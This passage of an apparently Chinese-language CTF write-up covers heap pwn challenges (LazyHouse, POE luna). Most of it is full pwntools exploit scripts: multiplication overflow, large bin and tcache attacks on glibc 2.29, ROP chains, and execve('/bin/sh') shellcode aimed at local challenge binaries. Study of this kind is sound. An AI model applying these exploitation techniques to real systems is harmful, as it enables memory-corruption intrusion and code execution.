    mov edx, 100
    xor eax, eax
    syscall ;// read
    mov edx, eax
    mov rsi, rsp
    mov eax, 1
    mov edi, eax
    syscall ;// write
    jmp exit
    fail:
    mov rax, 0x727265206e65706f ;// open error!
    mov [rsp], rax
    mov eax, 0x0a21726f
    mov [rsp+8], rax
    mov rsi, rsp
    mov edi, 1
    mov edx, 12
    mov eax, edi
    syscall ;// write
    exit:
    xor edi, edi
    mov eax, 231
    syscall 
    ''')
    edit(2, p64(libc_addr + 0x55E35) + p64(heap_addr + 0x260) + str(frame)[0x10:] + shellcode)
    delete(2)
    sh.interactive()
    clear()
###  另一种思路
利用 large bin attack 攻击 tcache->counts ，那么可以绕过限制直接调用后门。
## LazyHouse
乘法溢出漏洞，重要输入的值满足下面的判断就能导致溢出。
    unsigned long input;
    if((218 * input  (218 * input)))
    {
        puts("Multiplication overflow");
    }
其原理是利用乘法的进位使得恰好溢出，并且得到的值小于`116630`，可以利用除法来进行反向计算获得其溢出的输出。
    unsigned long input = -1;
    input = input/218 + 1;
###  思路
  * 乘法溢出，解除 内存申请的限制
  * chunk overlap，使得 heap 布局可以自由控制
  * 泄露 heap 地址，和 libc 地址
  * large bin attack 修改 global_max_fast ，使得可以继续使用fastbin
  * fastbin attack 劫持 tcache
  * 修改 hook ，利用 calloc 的特性进行栈转移。
  * ROP 读 flag
通过调试靶机的 libc 可以发现 calloc 函数使用 rbp 当做寄存器变量来存储 传入的 size，所以我们可以控制其 size 进行栈转移。
###  脚本
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols.c', 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # except Exception as e:
    #     pass
    context.arch = 'amd64'
    # context.arch = 'i386'
    # context.log_level = 'debug'
    execve_file = './lazyhouse'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
    sh = process(execve_file)
    # sh = remote('', 0)
    elf = ELF(execve_file)
    libc = ELF('./libc-2.29.so')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        def pr
            x/gx $rebase(0x5010)
            x/24gx $rebase(0x5060)
            end
        b calloc
        '''
        f = open('/tmp/gdb_pid', 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script', 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def add(index, size, content):
        sh.sendlineafter('Your choice: ', '1')
        sh.sendlineafter('Index:', str(index))
        sh.sendlineafter('Size:', str(size))
        if(content):
            sh.sendafter('House:', content)
    def show(index):
        sh.sendlineafter('Your choice: ', '2')
        sh.sendlineafter('Index:', str(index))
    def delete(index):
        sh.sendlineafter('Your choice: ', '3')
        sh.sendlineafter('Index:', str(index))
    def edit(index, content):
        sh.sendlineafter('Your choice: ', '4')
        sh.sendlineafter('Index:', str(index))
        sh.sendafter('House:', content)
    def triger(content):
        sh.sendlineafter('Your choice: ', '5')
        sh.sendafter('House:', content)
    # Multiplication overflow
    add(0, 0x12c9fb4d812c9fc, None)
    delete(0)
    # chunk overlap
    add(0, 0x88, 'n')
    add(1, 0x248, 'n')
    add(2, 0x248, 'n')
    add(6, 0x248, 'n')
    add(3, 0x88, 'n')
    add(7, 0x88, 'n')
    add(4, 0x448, 'n')
    for i in range(7):
        add(5, 0x248, 'n')
        delete(5)
    edit(0, 'a' * 0x80 + p64(0) + p64(0x781))
    delete(1)
    add(1, 0x338, 'b' * 0x240 + p64(0) + p64(0x251))
    add(5, 0x600, 'n')
    show(2)
    sh.recvn(0xf0)
    libc_addr = u64(sh.recvn(8)) - 1120 - (libc.symbols['__malloc_hook'] + 0x10)
    log.success('libc_addr: ' + hex(libc_addr))
    sh.recvn(8)
    heap_addr = u64(sh.recvn(8)) & 0xfffffffffffff000
    log.success('heap_addr: ' + hex(heap_addr))
    # large bin attack
    delete(2)
    add(2, 0x248, 'c' * 0xe0 + p64(0) + p64(0x441) + p64(libc_addr + 0x1e50a0) + p64(libc_addr + 0x1e50a0) + p64(0) + p64(libc_addr + 0x1e7600 - 0x20))
    delete(4)
    add(4, 0x88, 'n')
    # fastbin attack
    delete(4)
    delete(2)
    edit(1, 'd' * 0x240 + p64(0) + p64(0x251) + p64(heap_addr))
    # for ROP
    layout = [
        0,
        libc_addr + 0x0000000000026542, #: pop rdi; ret; 
        heap_addr + 0x540 + 0x100,
        libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
        0,
        libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
        2,
        libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
        libc_addr + 0x0000000000026542, #: pop rdi; ret; 
        3,
        libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
        heap_addr,
        libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
        0x100,
        libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
        0,
        libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
        libc_addr + 0x0000000000026542, #: pop rdi; ret; 
        1,
        libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
        heap_addr,
        libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
        0x100,
        libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
        1,
        libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
        libc_addr + 0x0000000000026542, #: pop rdi; ret; 
        0,
        libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
        231,
        libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
    ]
    add(2, 0x248, flat(layout).ljust(0x100, '') + './flag')
    # hijack tcache
    add(4, 0x248, '' * 0x40 + p64(0) * 0x20 + p64(libc_addr + libc.symbols['__malloc_hook']))
    triger(p64(libc_addr + 0x0058373))
    delete(4)
    # triger ROP
    sh.sendafter('Your choice: ', '1'.ljust(0x20, '0'))
    sh.sendlineafter('Index:', str(4))
    sh.sendlineafter('Size:', str(heap_addr + 0x540))
    sh.interactive()
    clear()
###  其他思路
  1. 利用 small bin 来劫持 tcache (balsn战队)
  2. 利用 SROP 代替栈转移
## POE luna
借用作者的原话，直接分析二进制代码就足够了。
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    import os
    import struct
    import random
    import time
    import sys
    import signal
    def clear(signum=None, stack=None):
        print('Strip  all debugging information')
        os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols.c', 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # except Exception as e:
    #     pass
    context.arch = 'amd64'
    # context.arch = 'i386'
    # context.log_level = 'debug'
    execve_file = './luna'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
    sh = process(execve_file)
    # sh = remote('', 0)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        def pr
            x/4gx 0x6D9340
            echo array:\n
            x/16x *(void **)0x6D9340
            end
        b *0x4011a2
        '''
        f = open('/tmp/gdb_pid', 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script', 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def new_tab():
        sh.sendlineafter('>>> ', 'n')
    def insert_tab(text):
        sh.sendlineafter('>>> ', 'i')
        sh.sendline(str(0))
        sh.sendline(text)
    def cut(num):
        sh.sendlineafter('>>> ', 'c')
        sh.sendline(str(0) + ' ' + str(num))
    def paste():
        sh.sendlineafter('>>> ', 'p')
        sh.sendline(str(0))
    def write(content):
        for i in range(len(content)):
            sh.sendlineafter('>>> ', 'r')
            sh.sendline(str(i) + ' ' + str(i + 1))
            sh.sendline(content[i])
    def select(index):
        sh.sendlineafter('>>> ', 's')
        sh.sendline(str(index))
    def display(start, end):
        sh.sendlineafter('>>> ', 'd')
        sh.sendline(str(start) + ' ' + str(end))
    insert_tab('a' * 0x18)
    cut(0x18)
    new_tab()
    insert_tab('b' * 0xf8)
    cut(0xf0)
    new_tab()
    paste()
    write(p64(0x21) * 8 + p64(8) + p64(0) + p64(elf.symbols['environ']))
    select(1)
    display(0, 8)
    environ_addr = u64(sh.recvn(8))
    log.success('environ_addr: ' + hex(environ_addr))
    select(2)
    write(p64(0x21) * 8 + p64(0x100) + p64(0) + p64(environ_addr - 0x130 - 8)) # main return
    select(1)
     # main return
    write(p64(0x6d9360) + p64(0x0000000000400bcb)) # leave; ret
    layout = [
        0,
        0x00000000004006a6, #: pop rdi; ret;
        0x6d9000,
        0x0000000000411583, #: pop rsi; ret; 
        0x2000,
        0x000000000044d836, #: pop rdx; ret; 
        7,
        elf.symbols['mprotect'],
        0x00000000004ae2a7, #: jmp rsp; 
    ]
    shellcode = asm('''
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    mul rsi
    mov al, 59
    syscall
    ''')
    new_tab()
    insert_tab(flat(layout) + shellcode)
    sh.sendlineafter('>>> ', 'q')
    sh.interactive()
    clear()